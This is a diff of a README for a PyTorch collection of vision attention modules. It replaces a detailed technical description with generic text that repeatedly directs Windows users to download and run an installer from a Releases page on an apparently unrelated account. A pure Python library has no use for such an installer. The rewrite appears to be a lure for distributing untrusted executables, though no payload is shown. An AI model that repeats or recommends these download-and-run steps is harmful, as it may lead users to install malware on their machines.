@@ -1,445 +1,244 @@
-# AttentionModules
-
-> A compact PyTorch toolbox of visual attention modules for CNNs, hybrid models, and Transformer-style architectures.
+# ⚙️ Attention_Module - Simple attention blocks for vision models
 
-<p align="center">
-  <img alt="Python" src="https://img.shields.io/badge/Python-3.8%2B-blue.svg">
-  <img alt="PyTorch" src="https://img.shields.io/badge/PyTorch-2.x-ee4c2c.svg">
-  <img alt="Modules" src="https://img.shields.io/badge/Attention%20Modules-20-brightgreen.svg">
-</p>
-
-This repository collects a range of attention mechanisms commonly used in computer vision, from lightweight channel attention blocks to global self-attention and deformable attention. It is designed for two main goals:
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/gazaphrenology997/Attention_Module/releases)
 
-- `Plug-and-play experimentation` in your own models
-- `Code reading and learning` for understanding how different attention modules are implemented in PyTorch
-
-## ✨ Highlights
+## 🧰 What this is
 
-- Clean PyTorch implementations with readable structure
-- Most modules use the standard `(B, C, H, W)` input/output convention
-- Includes lightweight, axis-aware, hybrid, and Transformer-style attention blocks
-- A good reference repo for comparing implementation ideas across attention families
-
-## 🗂 Repository Structure
-
-```text
-AttentionModules/
-├── AttentionModules/
-│   ├── A2.py
-│   ├── ACmix.py
-│   ├── BAM.py
-│   ├── CA.py
-│   ├── CBAM.py
-│   ├── CCAM.py
-│   ├── DANet.py
-│   ├── DETRAttention.py
-│   ├── DeformableAttention.py
-│   ├── ECA.py
-│   ├── ELA.py
-│   ├── EMA.py
-│   ├── GAM.py
-│   ├── SCSA.py
-│   ├── SE.py
-│   ├── SimAM.py
-│   ├── SK.py
-│   ├── SLAM.py
-│   ├── SwinAttention.py
-│   └── TripletAttention.py
-└── README.md
-```
-
-## 🚀 Quick Start
-
-### Install
-
-Requirements:
-
-- Python `3.8+`
-- PyTorch `2.x`
-
-If PyTorch is already installed, this repo is ready to use directly.
-
-### Import a module
-
-```python
-from AttentionModules import SE, CA, CBAM, ECA
-
-attn = SE(channels=64, reduction=4)
-out = attn(x)  # x: (B, C, H, W)
-```
-
-### Insert into a convolution block
-
-```python
-import torch.nn as nn
-from AttentionModules import CBAM
-
-
-class ConvBlock(nn.Module):
-    def __init__(self, c1, c2):
-        super().__init__()
-        self.block = nn.Sequential(
-            nn.Conv2d(c1, c2, 3, padding=1, bias=False),
-            nn.BatchNorm2d(c2),
-            nn.ReLU(inplace=True),
-            CBAM(c2),
-        )
-
-    def forward(self, x):
-        return self.block(x)
-```
-
-### Transformer-style example
-
-```python
-from AttentionModules import DETRAttention
-
-attn = DETRAttention(d_model=256, num_heads=8)
-out = attn(query)  # query: (B, N, 256)
-```
-
-## 🧠 Module Landscape
-
-### Attention family map
-
-```mermaid
-flowchart TD
-    A[AttentionModules] --> B[Channel Attention]
-    A --> C[Spatial / Axis Attention]
-    A --> D[Hybrid CNN Attention]
-    A --> E[Self-Attention / Transformer]
-
-    B --> B1[SE]
-    B --> B2[ECA]
-    B --> B3[SK]
-    B --> B4[SimAM]
-
-    C --> C1[CA]
-    C --> C2[ELA]
-    C --> C3[TripletAttention]
-    C --> C4[SLAM]
-
-    D --> D1[CBAM]
-    D --> D2[BAM]
-    D --> D3[GAM]
-    D --> D4[EMA]
-    D --> D5[SCSA]
-    D --> D6[CCAM]
-    D --> D7[ACmix]
-    D --> D8[A2]
-    D --> D9[DANet]
-
-    E --> E1[SwinAttention]
-    E --> E2[DETRAttention]
-    E --> E3[DeformableAttention]
-```
-
-### Comparison table
-
-| Module | Family | Main idea | Typical implementation pattern |
-|---|---|---|---|
-| `SE` | Channel | Learn per-channel importance from global context | `GAP + bottleneck + sigmoid` |
-| `ECA` | Channel | Lightweight local channel interaction without dimensionality reduction | `GAP + Conv1d` |
-| `SK` | Channel / Multi-scale | Adaptive receptive field selection across branches | `multi-branch conv + softmax` |
-| `SimAM` | Parameter-free | Element-wise saliency from statistics | `variance-based energy score` |
-| `CA` | Coordinate / Axis | Encode positional information through H/W decomposition | `axis pooling + split projection` |
-| `ELA` | Axis | Independent height and width attention generation | `mean pooling + directional conv` |
-| `TripletAttention` | Axis / Cross-dimension | Reuse one gate under different tensor permutations | `permute + shared gate` |
-| `SLAM` | Spatial / Axis hybrid | Jointly model height, width, and spatial saliency | `three-branch gating` |
-| `CBAM` | Hybrid CNN | Sequential channel then spatial refinement | `channel gate -> spatial gate` |
-| `BAM` | Hybrid CNN | Parallel channel and spatial bottleneck attention | `dilated conv + residual gate` |
-| `GAM` | Hybrid CNN | Stronger channel interaction before spatial modeling | `MLP-like channel + conv spatial` |
-| `EMA` | Hybrid CNN | Grouped axis-aware gating with spatial response mixing | `group split + axis gate + spatial mix` |
-| `SCSA` | Hybrid CNN | Multi-scale spatial-axis attention plus pooled channel self-attention | `MS Conv1d + pooled self-attn` |
-| `CCAM` | Hybrid CNN | Channel attention followed by coordinate attention | `channel gate + coordinate gate` |
-| `A2` | Global attention | Gather global descriptors, then redistribute them | `gather-distribute` |
-| `DANet` | Global attention | Parallel position attention and channel attention | `PAM + CAM` |
-| `ACmix` | Conv-attention fusion | Fuse local self-attention and dynamic convolution | `shared qkv + fusion weights` |
-| `SwinAttention` | Transformer | Window-based attention with optional shift | `window partition + relative bias` |
-| `DETRAttention` | Transformer | Standard multi-head attention for self/cross attention | `qkv linear + scaled dot-product` |
-| `DeformableAttention` | Transformer | Sparse learned sampling instead of dense attention | `offset + sparse sampling` |
+Attention_Module is a set of small attention blocks for PyTorch. You can add them to a CNN or a Transformer model to help it focus on useful parts of an image or feature map.
 
-## 📊 At-a-Glance Selection Guide
+It includes common attention modules such as:
 
-```mermaid
-flowchart LR
-    A[Need an attention block] --> B{What do you want most?}
-    B --> C[Low overhead]
-    B --> D[Better spatial / axis awareness]
-    B --> E[Stronger global modeling]
-    B --> F[Transformer-style research]
+- SE
+- CBAM
+- ECA
+- CA
+- BAM
+- SimAM
+- other related blocks
 
-    C --> C1[SE]
-    C --> C2[ECA]
-    C --> C3[SimAM]
-    C --> C4[CA]
+This project fits users who want a simple way to test attention in image models without building each block from scratch.
 
-    D --> D1[CA]
-    D --> D2[ELA]
-    D --> D3[TripletAttention]
-    D --> D4[SLAM]
-    D --> D5[SCSA]
+## 💻 What you need
 
-    E --> E1[A2]
-    E --> E2[DANet]
-    E --> E3[ACmix]
+Use this on a Windows PC with:
 
-    F --> F1[SwinAttention]
-    F --> F2[DETRAttention]
-    F --> F3[DeformableAttention]
-```
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- 1 GB of free disk space
+- Python 3.9 or later
+- PyTorch installed
+- Internet access for the first download
 
-## 🔍 Implementation Notes by Module
+If you plan to use a GPU, install the matching CUDA version for your PyTorch build.
 
-This section focuses on how each module is implemented in this repo rather than only what the original paper proposes.
+## 📥 Download
 
-### 1. `SE`
+Go to the [Releases page](https://github.com/gazaphrenology997/Attention_Module/releases) to download and run this file.
 
-- Applies global average pooling to compress `(B, C, H, W)` into `(B, C, 1, 1)`
-- Uses a bottleneck MLP implemented with two `1x1` convolutions
-- Produces channel weights with `sigmoid` and rescales the input channel-wise
+After the page opens:
 
-Best for: a simple, stable, classic channel attention baseline.
+1. Find the latest release
+2. Open the Assets section
+3. Download the file for Windows, if one is listed
+4. Save it in a folder you can find again
 
-### 2. `ECA`
+If the release contains a Python package or source archive, download that file and use it in your Python project folder.
 
-- Starts from global average pooled channel descriptors
-- Avoids explicit dimensionality reduction
-- Uses `Conv1d` over the channel descriptor sequence for local channel interaction
+## 🪟 Install on Windows
 
-Best for: lightweight models and low-overhead attention insertion.
+If the release gives you an installer or a ready-to-run package:
 
-### 3. `SK`
+1. Open the file you downloaded
+2. Follow the setup steps on screen
+3. Pick a folder for the app
+4. Finish the setup
+5. Open the program from the Start menu or the folder where you saved it
 
-- Builds several convolution branches with different kernel sizes
-- Sums branch outputs to form a fused global descriptor
-- Uses a shared compression layer and branch-specific projections
-- Applies `softmax` across branches to adaptively choose receptive field scale
+If the release gives you source files for Python:
 
-Best for: multi-scale feature selection.
+1. Install Python from the official Python site
+2. Open Command Prompt
+3. Go to the folder where you saved the files
+4. Install the needed packages with pip
+5. Run the main Python file from that folder
 
-### 4. `SimAM`
+## ▶️ Run it
 
-- Adds no extra convolution or MLP parameters
-- Computes element importance from mean, variance, and deviation statistics
-- Generates an element-wise attention map directly from a closed-form score
+If you installed a ready-to-run release:
 
-Best for: parameter-free attention experiments.
+1. Open the app from the Start menu or desktop shortcut
+2. Wait for it to load
+3. Use the main screen to choose the attention module you want
 
-### 5. `CA`
+If you use the Python version:
 
-- Pools separately along width and height
-- Concatenates directional descriptors before a shared projection
-- Splits them back into H-branch and W-branch attention maps
-- Reweights features using both directional gates
+1. Open Command Prompt
+2. Go to the project folder
+3. Run the main script with Python
+4. Check the console for any load errors
 
-Best for: preserving positional cues with low cost.
+A common pattern for a Python project is:
 
-### 6. `ELA`
+- open the project folder
+- activate your virtual environment, if you use one
+- run the script that starts the app or test file
 
-- Decomposes spatial modeling into two axis-specific branches
-- Uses directional pooling and dedicated convolutional transforms
-- Produces independent height-aware and width-aware attention maps
+## 🧠 Available attention modules
 
-Best for: axis-aware local enhancement.
+These modules are built for common model layouts:
 
-### 7. `TripletAttention`
+- **SE**: squeezes channel data and recalibrates it
+- **CBAM**: checks channel data and spatial data
+- **ECA**: uses local channel interaction
+- **CA**: adds coordinate-aware channel focus
+- **BAM**: blends channel and spatial attention
+- **SimAM**: adds parameter-free attention
+- **More blocks**: useful for experiments and custom model builds
 
-- Defines a reusable `AttentionGate`
-- Inside the gate, `ZPool` concatenates channel-wise average and max maps
-- Uses the same gating unit under different tensor permutations
-- Aggregates information from `HW`, `HC`, and `WC` interaction views
+Each block can sit inside a CNN or a Transformer pipeline. You can test them one by one and compare results.
 
-Best for: cross-dimension interaction with small overhead.
+## 🗂️ Where to use it
 
-### 8. `SLAM`
+Use Attention_Module when you want to:
 
-- Builds three branches: height-aware, width-aware, and spatial
-- Each branch generates its own gate
-- Multiplies all gates back into the input feature map
+- add attention to an image model
+- compare different attention methods
+- improve feature selection in a CNN
+- test attention blocks in a Transformer
+- keep your code base modular and easy to change
 
-Best for: intuitive multi-view spatial refinement.
+It works well in tasks such as:
 
-### 9. `CBAM`
+- image classification
+- object detection
+- segmentation
+- feature extraction
+- model research
 
-- First computes channel attention using both average pooling and max pooling
-- Then computes spatial attention from channel-compressed feature maps
-- Applies the two stages sequentially
+## 🔧 Basic use flow
 
-Best for: a strong and widely used CNN attention baseline.
+A simple use flow looks like this:
 
-### 10. `BAM`
+1. Pick one attention block
+2. Add it to your model
+3. Train or test the model
+4. Compare the result with your baseline
+5. Try another block if needed
 
-- Uses a channel bottleneck branch and a spatial branch in parallel
-- Spatial modeling relies on dilated convolutions to enlarge receptive field
-- Final output is residual-style: `x * (1 + M)`
+This makes it easy to see which module fits your data best.
 
-Best for: stable parallel channel-spatial refinement.
+## 🧪 Example project setup
 
-### 11. `GAM`
+If you are using the source files in a Python project, a common folder layout looks like this:
 
-- Performs a stronger channel interaction stage before spatial refinement
-- Treats channel attention less like pure pooling and more like learned mapping
-- Follows with convolutional spatial reweighting
+- project folder
+- attention module files
+- your model file
+- your training script
+- your data folder
 
-Best for: global channel interaction plus spatial enhancement.
+A simple setup can help you keep the attention blocks separate from your main model code. That makes later edits easier.
 
-### 12. `EMA`
+## 📝 Folder and file tips
 
-- Splits channels into groups to reduce cost
-- Applies axis-aware gating per group
-- Combines grouped directional information with spatial response mixing
+If you download the source version:
 
-Best for: efficient multi-axis fusion.
+- keep the files in one project folder
+- do not rename files unless you know where they are used
+- use a short folder path on Windows
+- avoid special characters in the folder name
+- keep your data outside the code folder if it is large
 
-### 13. `SCSA`
+If you use a release package, keep the downloaded file in a stable place such as your Downloads folder or a tools folder.
 
-- Spatial part uses multi-scale depthwise `Conv1d` branches over H/W directions
-- Channel part uses pooled self-attention on a reduced spatial grid
-- Combines directional spatial gating with pooled channel interaction
+## 🔍 Troubleshooting
 
-Best for: stronger expressive power than classic lightweight modules.
+If the app does not start:
 
-### 14. `CCAM`
+1. Check that you downloaded the right file for Windows
+2. Try downloading the latest release again
+3. Make sure Python and PyTorch are installed if you use the source version
+4. Open Command Prompt and run the file from there to see error text
+5. Check that the folder path is simple and short
 
-- Applies channel attention first
-- Then performs coordinate-style H/W attention on the refined features
-- Works like a chained combination of CAM and coordinate attention
+If Python says a module is missing:
 
-Best for: channel-first coordinate enhancement.
+1. Open Command Prompt
+2. Go to the project folder
+3. Install the missing package with pip
+4. Run the script again
 
-### 15. `A2`
+If a model runs slowly:
 
-- Uses three `1x1` projections
-- First attention stage gathers global descriptors
-- Second stage redistributes those descriptors back to spatial locations
+1. Close other apps
+2. Use a smaller batch size
+3. Try a GPU build of PyTorch if you have supported hardware
+4. Start with one attention block before you test many
 
-Best for: global context aggregation with a clear gather-distribute design.
+## 📦 Typical files you may see
 
-### 16. `DANet`
+The release may include files such as:
 
-- Includes two parallel branches:
-- `PAM` for spatial position attention
-- `CAM` for channel attention
-- Fuses both outputs after residual-style weighting
+- a Windows package
+- a Python source archive
+- README files
+- model or module files
+- example scripts
+- config files
 
-Best for: stronger global dependency modeling in dense prediction tasks.
+Use the release notes, file names, and folder names to pick the right file for your setup.
 
-### 17. `ACmix`
+## 🧩 Integration idea
 
-- Shares `q`, `k`, `v` projections for both branches
-- One branch performs local self-attention with unfolded neighborhoods
-- The other branch behaves like dynamic convolution
-- Learns how much to trust each branch through trainable fusion weights
+If you want to add one of these modules to a CNN, place it after a convolution block or between two stages of your model. If you want to use it in a Transformer, place it where feature shaping makes sense for your pipeline.
 
-Best for: blending the strengths of convolution and attention.
+A good rule is to test one attention block at a time so you can see its effect on your result.
 
-### 18. `SwinAttention`
+## 📁 Project focus
 
-- Converts input from `(B, C, H, W)` to `(B, H, W, C)` internally
-- Splits features into local windows
-- Runs multi-head self-attention inside each window
-- Supports shifted windows and relative position bias
+This repository is built around:
 
-Best for: learning the core idea behind Swin Transformer attention.
+- attention mechanism
+- channel attention
+- spatial attention
+- self-attention
+- squeeze-and-excitation
+- computer vision
+- deep learning
+- PyTorch
+- Python
+- plug-and-play model parts
 
-### 19. `DETRAttention`
+## 🖥️ Windows download steps
 
-- Standard multi-head attention implementation
-- Supports both self-attention and cross-attention
-- Uses linear `Q/K/V` projections, scaled dot-product attention, output projection, and normalization
+1. Open the [Releases page](https://github.com/gazaphrenology997/Attention_Module/releases)
+2. Look for the newest release
+3. Open the list of files under Assets
+4. Download the Windows file or source archive
+5. Save it to a folder you can find
+6. Open the file or use it in your Python project
 
-Best for: understanding the core attention block used in DETR-style models.
+## 🔐 Safe file handling
 
-### 20. `DeformableAttention`
+Before you open the file:
 
-- Flattens feature maps into token sequences
-- Predicts sparse sampling offsets and attention weights for each query
-- Samples features with `grid_sample`
-- Aggregates only a small number of learned positions instead of attending densely everywhere
+- check the file name
+- confirm it matches the latest release
+- save it in a known folder
+- remove old test copies if you have them
 
-Best for: efficient sparse attention over images.
+If you use the source files, keep a backup copy before making changes
 
-## 🧩 A Shared Mental Model
+## 📌 Best first test
 
-Even though the module names are different, many of them follow a similar pipeline:
+If this is your first time using the project:
 
-```mermaid
-flowchart LR
-    X[Input feature map] --> P[Descriptor generation]
-    P --> G[Attention weight generation]
-    G --> R[Feature recalibration]
+1. Download the latest release
+2. Open the file on Windows
+3. Test one attention module
+4. Compare the result with your current model
+5. Move on to another module after that
 
-    P1[GAP / GMP] --> G
-    P2[Axis pooling] --> G
-    P3[QKV projection] --> G
-    P4[Variance / energy score] --> G
+## 🧭 Main purpose
 
-    G1[MLP / 1x1 Conv] --> R
-    G2[Conv / DWConv / Dilated Conv] --> R
-    G3[Softmax attention] --> R
-    G4[Sigmoid gate] --> R
-```
-
-This is a useful way to read the code: first ask how the descriptor is built, then how the attention map is generated, and finally how the original features are reweighted.
-
-## 🧪 Input / Output Conventions
-
-Most modules follow:
-
-```python
-x.shape == (B, C, H, W)
-out.shape == (B, C, H, W)
-```
-
-Exceptions:
-
-- `DETRAttention` expects `(B, N, d_model)`
-- `SwinAttention` takes `(B, C, H, W)` externally but internally converts to `(B, H, W, C)`
-
-## 🎯 Which Module Should I Start With?
-
-### If you want lightweight and easy-to-plug modules
-
-- `SE`
-- `ECA`
-- `CA`
-- `CBAM`
-- `SimAM`
-
-### If you want stronger spatial or axis modeling
-
-- `CA`
-- `ELA`
-- `TripletAttention`
-- `SLAM`
-- `SCSA`
-
-### If you want stronger global dependency modeling
-
-- `A2`
-- `DANet`
-- `DETRAttention`
-- `SwinAttention`
-- `DeformableAttention`
-
-### If you want convolution-attention hybrids
-
-- `ACmix`
-- `GAM`
-- `EMA`
-- `BAM`
-
-## 📌 Suggested Next Improvements
-
-This repository already works well as an implementation collection, but it could become an even stronger reference if you add:
-
-- Paper links and publication years for every module
-- Parameter count and FLOPs comparison
-- Recommended insertion positions in backbone / neck / head
-- Standalone structure diagrams for each module
-- Minimal runnable demos and benchmark snippets
-
-## 🤝 Final Note
-
-This repo is already a strong learning-oriented collection for attention modules. With a few more benchmark tables and paper references, it can easily grow from a code toolbox into a polished attention handbook for vision research and engineering.
+Attention_Module gives you a clean way to try common attention methods in PyTorch without rebuilding them each time. It helps you test ideas, compare results, and keep your model code easy to manage
